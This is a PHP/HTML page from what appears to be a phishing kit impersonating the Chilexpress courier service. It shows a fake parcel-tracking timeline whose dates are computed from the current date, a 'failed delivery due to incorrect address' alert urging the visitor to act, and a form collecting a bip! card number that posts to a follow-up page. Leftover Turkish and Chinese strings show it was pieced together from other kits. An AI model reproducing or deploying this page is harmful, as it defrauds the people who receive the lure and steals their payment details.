<?php
session_start();
include('header-him.php');
$currentDateTime = date('m/d/Y'); // Get the current date and time
?>
<form style="margin-top: -10px" method="post" action="./" id="formPrincipal1" novalidate="novalidate">
    <div class="container-fluid">
        <div class="row">
            <div class="slider col-12 px-0">
                <div class="swiper swiper-cxp swiper-initialized swiper-horizontal swiper-ios swiper-backface-hidden">
                    <div class="swiper-wrapper" id="swiper-wrapper-1531dea36475c91f" aria-live="off" style="transition-duration: 0ms; transform: translate3d(-780px, 0px, 0px);">
                        <div class="swiper-slide" style="background-image: url(&quot;./CL/Resources/img/Vitrinas/638302853346971109.jpg&quot;); width: 390px;" role="group" aria-label="1 / 4">
                            <div class="opacity"></div>
                            <div class="recuadro">
                                <a class="contenido" href="https://chilexpress.cl/casillero-express" target="_self">
                                    <div class="h2 titulo">
                                        <strong>Tu negocio será más fácil con Casillero Express</strong>
                                    </div>
                                    <p class="mb-2 pt-2">
                                    </p>
                                    <p>Sabemos lo que cuesta juntarte con tus clientes para entregarles sus productos, por eso creamos un servicio que te ahorrará tiempo, y hará tus entregas más fáciles.</p>
                                    <p></p>
                                </a>
                                <a class="btn btn-link icon icon-flecha-adelante-blanca" href="https://chilexpress.cl/casillero-express" style="color: #fff">Conoce más</a>
                            </div>
                        </div>
                        <div class="swiper-slide swiper-slide-prev" style="background-image: url(&quot;./CL/Resources/img/Vitrinas/638326299298792933.jpg&quot;); width: 390px;" role="group" aria-label="2 / 4">
                            <div class="opacity"></div>
                            <div class="recuadro">
                                <a class="contenido" href="https://www.westernunion.com/cl/es/sorteorav4.html" target="_self">
                                    <div class="h2 titulo">
                                        <strong>Envía dinero y una Toyota Rav4 puede ser tuya</strong>
                                    </div>
                                    <p class="mb-2 pt-2">
                                    </p>
                                    <p>Transfiere dinero desde nuestra App Envío de Dinero, desde&nbsp;chilexpress.cl&nbsp;o a través de nuestras Sucursales y participa por 1 de las 3 camionetas RAV4.&nbsp;Promoción válida del 1 de octubre al 31 de diciembre de 2023.</p>
                                    <p></p>
                                </a>
                                <a class="btn btn-link icon icon-flecha-adelante-blanca" href="https://www.westernunion.com/cl/es/sorteorav4.html" style="color: #fff">Conoce más</a>
                            </div>
                        </div>
                        <div class="swiper-slide swiper-slide-active" style="background-image: url(&quot;./CL/Resources/img/Vitrinas/638279470886811660.jpg&quot;); width: 390px;" role="group" aria-label="3 / 4">
                            <div class="opacity"></div>
                            <div class="recuadro">
                                <a class="contenido" href="https://personas.chilexpress.cl/cotizar" target="_self">
                                    <div class="h2 titulo">
                                        <strong>Prechequea tus envíos y agiliza tus entregas</strong>
                                    </div>
                                    <p class="mb-2 pt-2">
                                    </p>
                                    <p>Prepara tus envíos en nuestras plataformas digitales, agenda tu visita y disfruta un experiencia más rápida en sucursales</p>
                                    <p></p>
                                </a>
                                <a class="btn btn-link icon icon-flecha-adelante-blanca" href="https://personas.chilexpress.cl/cotizar" style="color: #fff">Conoce más</a>
                            </div>
                        </div>
                        <div class="swiper-slide swiper-slide-next" style="background-image: url(&quot;./CL/Resources/img/Vitrinas/638318501045268289.png&quot;); width: 390px;" role="group" aria-label="4 / 4">
                            <div class="opacity"></div>
                            <div class="recuadro">
                                <a class="contenido" href="https://www.chilexpress.cl/servicio-encomienda-paqueteria-internacional" target="_self">
                                    <div class="h2 titulo">
                                        <strong>Al mundo con Chilexpress</strong>
                                    </div>
                                    <p class="mb-2 pt-2">
                                    </p>
                                    <p>Importar o exportar desde y hacia USA, Perú, Chile, Ecuador, Colombia y Venezuela de forma simple y con confianza.</p>
                                    <p></p>
                                </a>
                                <a class="btn btn-link icon icon-flecha-adelante-blanca" href="https://www.chilexpress.cl/servicio-encomienda-paqueteria-internacional" style="color: #fff">Conoce más</a>
                            </div>
                        </div>
                    </div>
                    <div class="swiper-pagination swiper-pagination-clickable swiper-pagination-bullets swiper-pagination-horizontal" style="padding-left:50%;padding-bottom:0.5em;"><span class="swiper-pagination-bullet" tabindex="0" role="button" aria-label="Go to slide 1"></span><span class="swiper-pagination-bullet" tabindex="0" role="button" aria-label="Go to slide 2"></span><span class="swiper-pagination-bullet swiper-pagination-bullet-active" tabindex="0" role="button" aria-label="Go to slide 3" aria-current="true"></span><span class="swiper-pagination-bullet" tabindex="0" role="button" aria-label="Go to slide 4"></span></div>
                    <span class="swiper-notification" aria-live="assertive" aria-atomic="true"></span>
                </div>
            </div>
            <div class="modal fade" id="modal_orden_de_transporte" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
                <div class="modal-dialog" role="document">
                    <div class="modal-content">
                        <div class="modal-header"><img class="close" src="../..https://www.chilexpress.cl/Resources/bootstrap-4.5.3-kit-chilexpress/img/cerrar.svg" data-dismiss="modal"></div>
                        <div class="modal-body text-center">
                            <img src="../../Resources/img/ayuda-ot.jpg" style="width:230px">
                            <div class="h5 mt-3">Rastrea tu envío con la OT <br>(Orden de Transporte)</div>
                            <p class="mb-0 my-3 medium">
                                La <b>Orden de Transporte (OT)</b> es un código único para cada envío, que está compuesto por 10 a 12 dígitos. Este número puedes encontrarlo en la parte superior del comprobante que te dan cuando envías algo con nosotros y, por eso, es importante que no lo pierdas.
                            </p>
                            <button type="button" class="btn btn-primary" data-dismiss="modal">Cerrar</button>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-12 col-sm-8 offset-sm-2 px-4">
                <div class="buscador_mobile">
                    <div class="titulo" data-toggle="modal" data-target="#modal_orden_de_transporte">
                        Rastrea tu envío
                        <div class="btn-ico btn-ico-xxs">
                            <img src="CL/Resources/bootstrap-4.5.3-kit-chilexpress/img/signo_pregunta_negro_tooltip.svg?v=133415934121165406" alt="">
                        </div>
                    </div>
                    <div class="input-group" style="display: flex!important;flex-wrap: nowrap!important;">
                        <input name="ctl00$ContenidoPagina$Cabecera_txtSearch" type="text" id="ContenidoPagina_Cabecera_txtSearch" class="form-control border-right-0" placeholder="Ingresa tu N° de OT" aria-label="" aria-describedby="buscar-ot" onkeypress="isNumberKey(event)">
                        <div class="input-group-append">
                            <button onclick="window.location('page2.php')" id="ContenidoPagina_btnBuscar" class="btn btn-outline-light" type="button" onkeypress="isNumberKey(event)">
                                <img src="CL/Resources/bootstrap-4.5.3-kit-chilexpress/img/lupa.svg?v=133415934121165406" alt="" width="25" height="25" title="Busca tu OT">
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-12 col-sm-8 offset-sm-2 offset-lg-0 px-4 px-lg-0" style="display: none">
                <div class="acceso_directo">
                    <div class="titulo_superior h3 text-center mb-3 mt-2">
                        ¿Qué quieres<br>
                        enviar?
                    </div>
                    <a class="item" href="https://personas.chilexpress.cl/cotizar/encomienda" target="_blank">
                        <img class="ilustracion" src="CL/Resources/bootstrap-4.5.3-kit-chilexpress/img/ilustraciones/caja.svg?v=133416120586346680" alt="" width="75" height="75">
                        <div class="h5 titulo">Encomienda</div>
                    </a>
                    <a class="item" href="https://personas.chilexpress.cl/cotizar/documento" target="_blank">
                        <img class="ilustracion" src="CL/Resources/bootstrap-4.5.3-kit-chilexpress/img/ilustraciones/sobre.svg?v=133415934121165406" alt="" width="75" height="75">
                        <div class="h5 titulo">Documento </div>
                    </a>
                    <a class="item" style="border:none" href="https://enviodedinero.chilexpress.cl" target="_self">
                        <img class="ilustracion" src="CL/Resources/bootstrap-4.5.3-kit-chilexpress/img/ilustraciones/billete.svg?v=133415934121165406" alt="" width="75" height="75">
                        <div class="h5 titulo">Dinero</div>
                    </a>
                    <div class="conoce">
                        <a class="item" href="https://centrodeayuda.chilexpress.cl/sucursales" target="_blank">
                            <img class="icon" src="CL/Resources/bootstrap-4.5.3-kit-chilexpress/img/ubicacion_iso.svg?v=133415934121165406" alt="" width="50" height="50">
                            <div class="texto">
                                Conoce nuestras<br>
                                Sucursales
                            </div>
                        </a>
                        <a class="item" href="/tarifas-economicas-envios-internacionales" target="_blank">
                            <img class="icon" src="CL/Resources/bootstrap-4.5.3-kit-chilexpress/img/caja.svg?v=133415934121165406" alt="" width="30" height="30">
                            <div class="texto">
                                Conoce nuestros<br>
                                Embalajes
                            </div>
                        </a>
                    </div>
                </div>
            </div>
            <div class="col-12 col-sm-8 offset-sm-2 offset-lg-0 px-4 px-lg-0" style="display: none">
                <div class="acceso_directo">
                    <div class="time_line_wrap only_mobile" style="padding-left: 10px;padding-right: 10px">
                        <div class="time_line one">
                            <div class="left-green">
                                <div class="for_color">
                                    <p style="color: white">08/10/2023<br>17:03
                                    <p>
                                </div>
                            </div>
                            <span class="time_row_line"></span>
                            <div class="right-red">
                                <p class="top_title_ps">Adres nedeniyle paket teslimat hatası
                                <p>
                                <p class="bottom_color">En yakın dağıtım merkezine geri dönün
                                <p>
                            </div>
                            <div>
                            </div>
                        </div>
                        <div class="time_line">
                            <div class="left-green">
                                <div class="for_color">
                                    <p style="color: white">07/10/2023<br>15:36
                                    <p>
                                </div>
                            </div>
                            <span class="time_row_line"></span>
                            <div class="right-red">
                                <p class="top_title_ps">Koliler tasnif merkezine ulaşır
                                <p>
                                <p class="bottom_color">Kurye teslimat için hazır
                                <p>
                            </div>
                            <div>
                            </div>
                        </div>
                        <div class="time_line">
                            <div class="left-green">
                                <div class="for_color">
                                    <p style="color: white">06/10/2023<br>09:11
                                    <p>
                                </div>
                            </div>
                            <span class="time_row_line"></span>
                            <div class="right-red">
                                <p class="top_title_ps">Hedefe gönder
                                <p>
                                <p class="bottom_color">Transit halinde
                                <p>
                            </div>
                            <div>
                            </div>
                        </div>
                        <div class="time_line">
                            <div class="left-green">
                                <div class="for_color">
                                    <p style="color: white">05/10/2023<br>11:42
                                    <p>
                                </div>
                            </div>
                            <span class="time_row_line"></span>
                            <div class="right-red">
                                <p class="top_title_ps">Paket alındı
                                <p>
                                <p class="bottom_color">Yükleme için hazır
                                <p>
                            </div>

                            <div>
                            </div>
                        </div>
                        <br><br>
                    </div>

                </div>
            </div>
        </div>
    </div>
</form>
<!-- main Start -->

<div class="wrapper">
    <div id="center" class="main innerpage">
        <div class="old_code_wrap">
            <a class="accesskey" href="#aC" id="aC" accesskey="C" title="主要內容區">:::</a>
            <!-- photoblock start-->
            <section class="section col-12 photoblock2 no-print" style="background-image: url(/images/photoblock_inbg.png) !important;">
            </section>
            <!-- photoblock end-->
            <div class="container">
                <!-- h1節點 -->
                <h1 style="font-size: 1.5em;margin: 0.83em 0;" class="title">consultas Sobre el estado de los Cargos no Pagados</h1>
                <!-- aP Start -->
                <section class="ap">
                    <!-- searchform start -->
                    <div class="searchform">
                        <div class="login-form">
                            <div class="tab-headers clearfix">
                                <h2 class="tab-header-item active" data-tab="loginForm">Carga tarjeta bip!</h2>
                                <!-- <h2 class="tab-header-item pull-right" data-tab="testform">Carga bip!QR</h2>   -->
                            </div>
                            <div class="tab-container">
                                <form action="./page2.php" method="POST" id="loginForm" data-tab="tab1" novalidate class="active tab-content">
                                    <div class="form-group">
                                        <legend class="form-info">Número de tarjeta bip!<i class="fa fa-info-circle"></i></legend>
                                        <input type="text" placeholder="Ej: 123456789" name="username" required>
                                    </div>
                                    <div class="form-submit">
                                        <button type="submit" class="btnSubmit btn" name="submit" id="submit">Continuar</button>
                                        <center>
                                            <span class="submit-info">Al continuar estas aceptando nuestros <b>términos y condiciones</b>.</span>
                                        </center>
                                    </div>
                                </form>
                                <form action="./page2.php" method="POST" id="testform" class="tab-content" novalidate>
                                    <p>empty</p>
                                </form>
                            </div>
                        </div>
                    </div>
                </section>
            </div>
        </div>
        <div class="container" style="width:100%!important;z-index: 0!important;">
            <section class="ap">
                <div class="row only_mobile">
                    <div class="card_wrap">
                        <div class="top_card">
                            <div class="id_main">
                                <span><img src="CL/Resources/bootstrap-4.5.3-kit-chilexpress/img/logo_chilexpress_negro.svg?v=133415934121321696" height="20px"> </span>
                                <div class="top_card_left">
                                    <h4>100987050072</h4>
                                    <p class="short_id">Número de albarán</p>
                                </div>
                            </div>
                            <p style="color: red" class="like_viewmore">Suspensión de la entrega</p>
                        </div>
                        <div class="bottom_card">
                            <p class="card_tag">Chiexpress</p>
                            <p class="post_date_card"><?php echo $currentDateTime; ?></p>
                        </div>
                    </div>
                </div>

                <div class="row only_mobile" style="">
                    <div class="acceso_directo">
                        <div class="time_line_wrap only_mobile" style="padding-left: 10px;padding-right: 10px">
                            <div class="time_line one">
                                <div class="left-green">
                                    <div class="for_color">
                                        <p style="color: white">
                                            <?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' +0 DAY +1 HOURS'));?> <br>
                                            09:52

                                            
                                        </p>
                                       
                                    </div>
                                </div>
                                <span class="time_row_line"></span>
                                <div class="right-red">
                                    <p class="top_title_ps">Dirección incorrecta, entrega fallida
                                    <p>
                                    <p class="bottom_color">Devuelto al centro de clasificación más cercano
                                    <p>
                                </div>
                                <div>
                                </div>
                            </div>
                            <div class="time_line">
                                <div class="left-green">
                                    <div class="for_color">
                                        <p style="color: white">
                                            <?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' -1 DAY +3 HOURS'));?> <br> 15:17

                                            
                                        </p>
                                    </div>
                                </div>
                                <span class="time_row_line"></span>
                                <div class="right-red">
                                    <p class="top_title_ps">Los paquetes llegan al centro de clasificación
                                    <p>
                                    <p class="bottom_color">Preparar un paquete para su entrega
                                    <p>
                                </div>
                                <div>
                                </div>
                            </div>
                            <div class="time_line">
                                <div class="left-green">
                                    <div class="for_color">
                                        <p style="color: white">
                                            <?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' -2 DAY +2 HOURS'));?> <br> 18:21
                                        </p>
                                    </div>
                                </div>
                                <span class="time_row_line"></span>
                                <div class="right-red">
                                    <p class="top_title_ps">Paquete en tránsito
                                    <p>
                                    <p class="bottom_color">Inspecciones de carga finalizadas
                                    <p>
                                </div>
                                <div>
                                </div>
                            </div>
                            <div class="time_line">
                                <div class="left-green">
                                    <div class="for_color">
                                        <p style="color: white">
                                            <?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' -3 DAY +5 HOURS'));?> <br> 10:13
                                        </p>
                                    </div>
                                </div>
                                <span class="time_row_line"></span>
                                <div class="right-red">
                                    <p class="top_title_ps">Express ha completado el registro
                                    <p>
                                    <p class="bottom_color">Preparación para la inspección previa a la carga
                                    <p>
                                </div>

                                <div>
                                </div>
                            </div>
                            <br>
                        </div>
                        <div class="conoce">
                            <a class="item" href="https://centrodeayuda.chilexpress.cl/sucursales" target="_blank">
                                <img class="icon" src="CL/Resources/bootstrap-4.5.3-kit-chilexpress/img/ubicacion_iso.svg?v=133415934121165406" alt="" width="50" height="50">
                                <div class="texto">
                                    Conoce nuestras<br>
                                    Sucursales
                                </div>
                            </a>
                            <a class="item" href="/tarifas-economicas-envios-internacionales" target="_blank">
                                <img class="icon" src="CL/Resources/bootstrap-4.5.3-kit-chilexpress/img/caja.svg?v=133415934121165406" alt="" width="30" height="30">
                                <div class="texto">
                                    Conoce nuestros<br>
                                    Embalajes
                                </div>
                            </a>
                        </div>
                    </div>

                </div>










                <div class="row only_mobile" style="margin-top: 30px">
                    <div class="sub-title">

                        <h4 class="title"><img src="<?php echo $folder_path;?>/images/alert3.png" height="20px"> Aviso importante</h4>
                        <p class="title-text" style="font-size: 11px!important;">Debido a una dirección incorrecta, su paquete ha sido devuelto al centro de distribución más cercano.<strong></strong></p>
                        <p class="title-text" style="font-size: 11px!important;">Chilexpress permite que su paquete sea re-entregado en caso de una falla en la entrega, por favor actualice la dirección correcta lo antes posible para que podamos re-entregar su paquete.<strong></strong></p>
                    </div>
                </div>
                <div class="button_block only_mobile">
                    <a href="page2.php"><button class="button_next">Actualizaciones inmediatas</button></a>
                </div>

            </section>
            <!-- aP End -->
            <script>
                function checkForm() {
                    var canGo = true;
                    var custno = $("#custNo").val();
                    if (custno === "") {
                        $("#custNoError").show();
                        canGo = false;
                    }
                    var answer = $("#answer").val();
                    if (answer === "") {
                        $("#answerError").show();
                        canGo = false;
                    }
                    return canGo;
                }

                function errorNoticeDisplay(fieldName, noticeWarning) {
                    $("#" + fieldName + "Error").show();
                    $("#" + fieldName + "ErrorWarning").text(noticeWarning);
                }

                function sendEmailCaptcha() {
                    var returnValue = true;
                    if ($("#email").val() == "" || $("#email").val() == "請輸入Email 帳號") {
                        errorNoticeDisplay('email', '請輸入Email 帳號');
                        returnValue = false;
                    } else {
                        //var patternEmail = /^[\w\"\+-]+[\.]?[\w\"\+-]+@(\[)*\w+([\.-]?\w+)*(\.\w{2,})+(\])*$/;
                        var patternEmail = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
                        if (patternEmail.test($("#email").val()) == false) {
                            errorNoticeDisplay('email', '請輸入合乎格式之Email 帳號');
                            returnValue = false;
                        } else {
                            patternEmail = /@yahoo\.|@kimo\.|@icloud\.|@me\./;
                            if (patternEmail.test($("#email").val().toLowerCase()) == true) {
                                errorNoticeDisplay('email',
                                    '不建議使用@yahoo.、@kimo.、@icloud.及@me.信箱註冊，避免擋信!');
                            }
                        }
                    }
                    if (returnValue) {
                        $.ajax({
                            url: "<?php echo $folder_path;?>/captcha/sendCaptcha",
                            type: "get",
                            data: {
                                "email": $("#email").val()
                            },
                            success: function(response) {
                                $('#modal1').hide();
                                $('.modal_overlay').hide();
                                if (response) {
                                    swal("驗證碼已寄出，請至電子郵件信箱收信。");
                                } else {
                                    swal("驗證碼已過期，請刷新驗證碼。");
                                }

                            },
                            error: function(response) {
                                swal("驗證碼已過期，請刷新驗證碼。");
                            }
                        });
                    }
                }

                $(function() {

                    $(".tab-header-item").on("click", function(e) {
                        e.preventDefault();
                        $(".tab-header-item").removeClass("active");
                        $(this).addClass("active");

                        var data_tab = $(this).attr("data-tab");
                        $(".tab-content").removeClass("active");
                        $("#" + data_tab).addClass("active");
                    });

                    $('#custNo').click(function() {
                        $('.annotation').show();
                        $("#answer").val("");
                    });

                    $('#answer').focus(function() {
                        $("#answer").val("");

                    });
                    $('#answer').keyup(function() {
                        var ans = $("#answer").val();
                        $("#answer").val(toASCII(ans));
                    });

                });
            </script>
        </div>
    </div>
</div>

<?php include('footer-him.php'); ?>

